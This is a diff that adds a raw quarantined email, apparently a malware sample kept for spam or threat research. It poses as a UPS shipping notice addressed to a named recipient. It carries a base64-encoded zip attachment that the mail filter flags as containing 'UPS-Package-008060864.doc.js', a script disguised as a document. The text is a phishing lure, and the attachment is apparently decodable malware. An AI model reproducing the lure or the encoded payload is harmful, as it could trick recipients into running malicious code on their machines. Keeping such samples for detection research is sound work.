@@ -1,0 +1,67 @@
+Return-Path: <presta@www.e-conrad.iq.pl>
+Delivered-To: banned-quarantine
+X-Envelope-To: <mehak_sharma@jcbl.com>
+X-Envelope-To-Blocked: <mehak_sharma@jcbl.com>
+X-Quarantine-ID: <am8uWM51rkdi>
+X-Amavis-Alert: BANNED, message contains .asc,UPS-Package-008060864.doc.js
+X-Spam-Flag: NO
+X-Spam-Score: 0
+X-Spam-Level:
+X-Spam-Status: No, score=x tag=x tag2=x kill=x tests=[] autolearn=unavailable
+Received: from mx10.jcbl.com ([127.0.0.1])
+	by localhost (mx9.jcbl.com [127.0.0.1]) (amavisd-new, port 10024)
+	with ESMTP id am8uWM51rkdi for <mehak_sharma@jcbl.com>;
+	Wed,  8 Mar 2017 03:27:42 +0530 (IST)
+Received: from www.e-conrad.iq.pl (unknown [46.248.165.161])
+	by mx10.jcbl.com (Postfix) with ESMTPS id 567DFF65F9F
+	for <mehak_sharma@jcbl.com>; Wed,  8 Mar 2017 03:27:40 +0530 (IST)
+Received: from presta by www.e-conrad.iq.pl with local (Exim 4.80.1)
+	(envelope-from <presta@www.e-conrad.iq.pl>)
+	id 1clN7W-0005n3-Da
+	for mehak_sharma@jcbl.com; Tue, 07 Mar 2017 22:58:14 +0100
+To: mehak_sharma@jcbl.com
+Subject: Notification status of your delivery (UPS 008060864)
+X-PHP-Originating-Script: 1008:post.php(3) : regexp code(1) : eval()'d code(17) : eval()'d code
+Date: Wed, 8 Mar 2017 00:58:13 +0300
+Content-Type: multipart/mixed;
+	boundary="bound1_e00ef66af3d820c6e176b5e3f04566fa"
+Content-Transfer-Encoding: 8bit
+Message-Id: <E1clN7W-0005n3-Da@www.e-conrad.iq.pl>
+From: presta@www.e-conrad.iq.pl
+
+--bound1_e00ef66af3d820c6e176b5e3f04566fa
+Content-Type: text/plain; charset=us-ascii
+
+Dear Mehak,
+
+This is to confirm that your item has been shipped at March 07.
+
+You can find more details in this e-mail attachment!
+
+Thank you for your consideration,
+Harry Vogel,
+UPS Station Manager.
+
+
+--bound1_e00ef66af3d820c6e176b5e3f04566fa
+Content-Type: application/zip; name="UPS-Package-008060864.zip"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename=UPS-Package-008060864.zip
+
+UEsDBBQAAAAIAMNc0ki9MQtvJQIAAE0CAAAdAAAAVVBTLVBhY2thZ2UtMDA4MDYwODY0LmRvYy56
+aXAL8GZmEWFgYOBg8FlTqaFnvWbBZkYGhlgmBgYZoGhoQLBuQGJydmJ6qq6BgYWBmYGFmYleSn6y
+Xlax6YTC/NkGAkf3dx2VFxXUVXSYnLtm9qpMr1WmmWKLphn6TnXue8CWkyTtNPPX3WoTlsan39/N
+e9+ereX5eqJ0kk/9ut6GKyu6/azkz5/Y359mFHM+yfBe0/cdEamnA/RVbFPm7d8z9bLXumXSt1q0
+/m5dkax+OuLLC3tvud/HrWxW/ZFMeHRy98SODMn/K/cWls7Qv71SOHX/5dXyZ1VOJeefu5s84w3/
+6eUftapmnZ07b/FetwlTnnH5SQUUWUy67bJZalH7WW6VWybPVmkWXe979n3z16pMnl8fVvzuTlTS
+WufIt186rFDL5HnwkiXrlyly3bjYVLhsS81dz8CpZUpcjy95bNK6ya3HNW3FvUMRp4oCtp3SuL5m
+SlK0YveD520yO+/kbeR2WOn4kolZPvSJV6tK2vEDeXMaNqzvnct8/yXP92mmCv/9H+Sxz8uMrZPk
+O2/+cPH1XWGfp//dfCvQYYLo7YNiqgWbv+ptZN6fPYdxG9M+09/RE2YwRzdpCQpdu5AxZ6pQ8LfJ
+J82Nfn6ZGRMjkGm8r/WZomk3467wxX3Lu72jp1peznj80PSs4W8lCXPeLJ4LtzwW/G7Y89BbaNXk
+My16N18+kA3wZgRGLO7ohgAFKI0v8gO8WdlAahiB0AtIv2UE8QBQSwECAAAUAAAACADDXNJIvTEL
+byUCAABNAgAAHQAAAAAAAAAAACAAAAAAAAAAVVBTLVBhY2thZ2UtMDA4MDYwODY0LmRvYy56aXBQ
+SwUGAAAAAAEAAQBLAAAAYAIAAAAA
+
+
+--bound1_e00ef66af3d820c6e176b5e3f04566fa--
+
